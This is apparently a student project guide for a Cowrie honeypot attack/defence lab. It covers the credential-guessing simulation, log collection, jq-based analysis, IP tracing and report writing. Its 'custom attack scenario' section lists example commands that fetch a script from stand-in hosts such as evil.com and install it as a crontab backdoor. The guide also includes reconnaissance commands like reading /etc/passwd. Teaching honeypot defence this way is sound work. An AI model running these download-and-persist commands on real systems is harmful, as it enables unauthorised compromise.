# Attack/defence exercise guide

This guide explains how to use the attack and defence tools to complete a full honeypot attack/defence exercise.

## Environment preparation

### 1. Start the honeypot VM

```bash
# Start the Cowrie honeypot via virt-manager or virsh
sudo virsh start cowrie-honeypot

# Or use the original VirtualBox image
VBoxManage startvm UbuntuCowrie
```

### 2. Confirm network reachability

```bash
# From the attacker machine, test whether the honeypot is reachable (default port 2222)
nc -zv 192.168.122.123 2222

# Or use telnet
telnet 192.168.122.123 2222
```

## Full attack/defence workflow

### Stage 1: simulate an attack (attacker view)

```bash
cd attack/

# 1. Check the credential list
cat payloads/common_creds.txt

# 2. Edit the list as needed (optional)
vim payloads/common_creds.txt

# 3. Start the attack simulation
./simulate_attack.sh 192.168.122.123 2222

# 4. Wait for the attack to finish (about 2-5 minutes, depending on the wordlist size)
# The script automatically tries credential guessing and runs reconnaissance commands

# 5. View the attack log
ls -lh logs/
cat logs/attack_*.log
```

**Expected output**:

- the terminal shows login attempt results live (success/failure)
- after a successful login, 18 reconnaissance commands run automatically
- a detailed log file is generated

### Stage 2: collect logs (honeypot administrator)

Log in to the honeypot VM:

```bash
# SSH into the honeypot (use the real SSH port 22, not Cowrie's 2222)
ssh cowrie@192.168.122.123

# Or log in directly at the VM console
# username: cowrie
# password: 123456
```

View the Cowrie logs on the honeypot:

```bash
cd ~/cowrie/var/log/cowrie

# View the latest logs
ls -lht

# Tail the log live (optional)
tail -f cowrie.json | jq .

# View login attempts
jq 'select(.eventid == "cowrie.login.failed" or .eventid == "cowrie.login.success")' cowrie.json

# View command executions
jq 'select(.eventid == "cowrie.command.input")' cowrie.json | jq -r .input
```

### Stage 3: analyse logs (defender view)

**Option A: analyse directly on the honeypot**

Copy the defence tools to the honeypot:

```bash
# On the attacker machine
cd /path/to/gruop_work
scp -r defense/ cowrie@192.168.122.123:~/

# Run the analysis on the honeypot
ssh cowrie@192.168.122.123
cd defense/
./analyze_logs.sh ~/cowrie/var/log/cowrie
```

**Option B: pull logs to analyse locally (recommended)**

```bash
# On the attacker machine
cd defense/

# Copy the logs locally
mkdir -p cowrie_logs
scp cowrie@192.168.122.123:~/cowrie/var/log/cowrie/cowrie.json cowrie_logs/

# Analyse the local logs
./analyze_logs.sh cowrie_logs/
```

**The analysis process**:

1. the script parses the Cowrie JSON log automatically
2. extracts login attempts, successful logins and command executions
3. performs geolocation tracing for all IPs (may take 2-5 minutes)
4. produces statistics and a summary report
5. produces a detailed Markdown report

### Stage 4: view the report

```bash
cd defense/reports/

# List the latest report files
ls -lt | head -5

# Open the latest report directory
cd analysis_20261026_*/  # replace with the actual timestamp

# View the summary report (plain text)
cat analysis_*.summary.txt

# View the detailed report (Markdown)
cat analysis_*.report.md

# Or use a Markdown viewer
# Arch: sudo pacman -S glow && glow analysis_*.report.md
# Or open it with a browser Markdown preview extension
```

## Interpreting the results

### 1. Login statistics

```
Total login attempts: 24
  |- failed: 18
  \- succeeded: 6
Success rate: 25.00%
```

**Interpretation**:

- the 25% success rate is caused by Cowrie's **random authentication mechanism**
- under Cowrie's default config, any credential has some probability of being "accepted"
- this is a honeypot feature, used to lure the attacker into continuing

### 2. Top credentials

```
TOP 10 Usernames        TOP 10 Passwords
  6 x   root              5 x   admin
  5 x   admin             4 x   123456
  4 x   ubuntu            3 x   password
```

**Interpretation**:

- `root` is the most attacked account
- `admin`, `123456`, `password` are the most common weak passwords
- these are high-frequency patterns in real attacks

### 3. Command analysis

```
TOP 10 Commands
  15 x   whoami
  12 x   uname -a
  10 x   ls -la /root
   8 x   cat /etc/passwd
```

**Interpretation**:

- **reconnaissance phase**: `whoami`, `uname` confirm system info
- **privilege probing**: `ls /root` tests whether root access exists
- **account enumeration**: `cat /etc/passwd` looks for other accounts
- **suspicious behaviour**: `wget`, `curl`, `/tmp/*.sh` may indicate downloading a malicious script

### 4. IP tracing

```
Source IP: 1.2.3.4
Country: United States (US)
ISP: Example Hosting
Threat level: MEDIUM
Tags: cloud, scanner
```

**Interpretation**:

- **internal IP** (192.168.*): test traffic, threat level LOW
- **cloud-provider IP**: possibly a compromised cloud host, threat level MEDIUM
- **high-risk-region IP** (CN/RU/KP/IR): automatically marked MEDIUM (geolocation only, not discriminatory)
- **tag scanner**: the hostname contains a bot/scanner keyword

## FAQ

### Q1: the attack script cannot connect to the honeypot

**Checks**:

```bash
# 1. Confirm the honeypot VM is running
sudo virsh list --all

# 2. Confirm the IP address
sudo virsh domifaddr cowrie-honeypot

# 3. Confirm the port is open
nc -zv 192.168.122.123 2222

# 4. Check the firewall
sudo iptables -L -n | grep 2222
```

### Q2: all logins fail

**Possible causes**:

1. Cowrie is not running properly
2. the port is taken by the real sshd
3. the credential list format is wrong

**How to check**:

```bash
# Check Cowrie status on the honeypot
ssh cowrie@192.168.122.123
cd ~/cowrie
bin/cowrie status

# View the Cowrie log
tail -50 var/log/cowrie/cowrie.log
```

### Q3: IP tracing fails

**Possible causes**:

1. the attacker machine cannot reach the internet
2. ip-api.com is unavailable
3. the rate limit was triggered

**Fixes**:

```bash
# 1. Test the network
curl -s "http://ip-api.com/json/8.8.8.8"

# 2. Use the cache
./ip_tracker.py 8.8.8.8  # the second lookup uses the cache

# 3. Skip IP tracing
# Edit analyze_logs.sh and comment out the enrich_ips call
```

### Q4: garbled characters in the report

```bash
# Confirm the terminal encoding
echo $LANG

# Set UTF-8
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

# Re-run the analysis
./analyze_logs.sh
```

## Advanced usage

### 1. Custom attack scenario

Edit the `ATTACK_COMMANDS` array in `attack/simulate_attack.sh`:

```bash
ATTACK_COMMANDS=(
    "whoami"
    "wget http://malicious.example.com/malware.sh"  # simulate downloading a malicious script
    "curl -o /tmp/backdoor.sh http://evil.com/bd.sh"
    "chmod +x /tmp/backdoor.sh"
    "crontab -l"  # probe scheduled tasks
    "echo '* * * * * /tmp/backdoor.sh' | crontab -"  # try to add a backdoor
)
```

### 2. Bulk IP tracing

```bash
# Extract all IPs from multiple logs
jq -r 'select(.src_ip != null) | .src_ip' cowrie_logs/*.json | sort -u > all_ips.txt

# Bulk lookup
./defense/ip_tracker.py --file all_ips.txt --json > all_ip_info.json

# Filter high-risk IPs
jq '.[] | select(.threat_level == "high" or .threat_level == "medium")' all_ip_info.json
```

### 3. Time-series analysis

```bash
# Count login attempts by hour
jq -r 'select(.eventid == "cowrie.login.failed") | .timestamp' cowrie.json | \
    cut -c12-13 | sort | uniq -c

# Example result:
#  15 08   # 15 attempts at 8 am
#  42 14   # 42 attempts at 2 pm
#  31 20   # 31 attempts at 8 pm
```

### 4. Visualisation (optional)

Generate charts with Python:

```bash
# Install dependencies
pip install matplotlib pandas

# Generate a chart (write your own script or use a Jupyter Notebook)
python3 << 'EOF'
import json
import matplotlib.pyplot as plt
from collections import Counter

# Read the data
with open('defense/reports/analysis_*/ip_enrichment.json') as f:
    ips = json.load(f)

# Count the country distribution
countries = Counter(ip['country'] for ip in ips if not ip['is_internal'])

# Draw a pie chart
plt.figure(figsize=(10, 6))
plt.pie(countries.values(), labels=countries.keys(), autopct='%1.1f%%')
plt.title('Attack source geographic distribution')
plt.savefig('attack_sources.png')
print("Chart saved to attack_sources.png")
EOF
```

## Report writing suggestions

The data these tools generate can be used directly in the following sections of the CA2 report:

### 5. Attack Simulation

```markdown
We simulated attacks using a custom script that performed:
- **Brute-force attempts**: 24 login attempts with common credentials
- **Successful logins**: 6 successful authentications (25% success rate)
- **Reconnaissance**: 18 commands executed post-login

[insert key snippets from attack/logs/attack_*.log]
```

### 6. Log Analysis

```markdown
#### Login Analysis

| Username | Attempts | Success |
|----------|----------|---------|
| root     | 6        | 2       |
| admin    | 5        | 1       |
| ubuntu   | 4        | 1       |

[copy the statistics from defense/reports/analysis_*.summary.txt]

#### Command Analysis

The attacker executed 85 commands, categorized as follows:
- Reconnaissance: 45 commands (whoami, uname, ps)
- File probing: 20 commands (ls, cat, find)
- Network probing: 10 commands (netstat, ifconfig)

[copy from the command analysis section of defense/reports/analysis_*.report.md]

#### Attack Source Analysis

| IP | Country | ISP | Threat Level |
|----|---------|-----|--------------|
| 192.168.122.1 | Internal | LAN | LOW |

[tabulate the data extracted from ip_enrichment.json]
```

### 7. Security Recommendations

Use the recommendations output by the report generator directly:

```markdown
Based on the honeypot log analysis, we recommend:

1. **Disable weak password accounts**
   - Detected high-frequency weak passwords: `admin`, `123456`, `password`
   - Enforce strong password policy (min 12 chars, mixed case, numbers, symbols)

2. **Restrict SSH access**
   - Change default SSH port (22)
   - Configure fail2ban to auto-ban brute-force IPs
   - Use key-based authentication instead of passwords

[copy the full content from the security recommendations section of defense/reports/analysis_*.report.md]
```

## Time planning

Estimated time for one full attack/defence exercise:

| Stage | Time |
|------|------|
| Environment preparation | 10 min |
| Attack simulation | 5 min |
| Log collection | 3 min |
| Log analysis (incl. IP tracing) | 5-10 min |
| Report review and screenshots | 10 min |
| **Total** | **30-40 min** |

Allow 1 hour to handle surprises.

## Caveats

**Important reminders**

1. **Use only in an authorised environment** - attacking systems you are not authorised to test is illegal
2. **LAN testing** - make sure both the honeypot and the attacker machine are in an isolated LAN
3. **Data privacy** - logs and reports may contain sensitive information, keep them safe
4. **Academic integrity** - if AI tools were used to generate code, declare it as the school requires

## Contact

For questions, contact the project team members:

- Huz (yui2667@outlook.com)
- [other members]
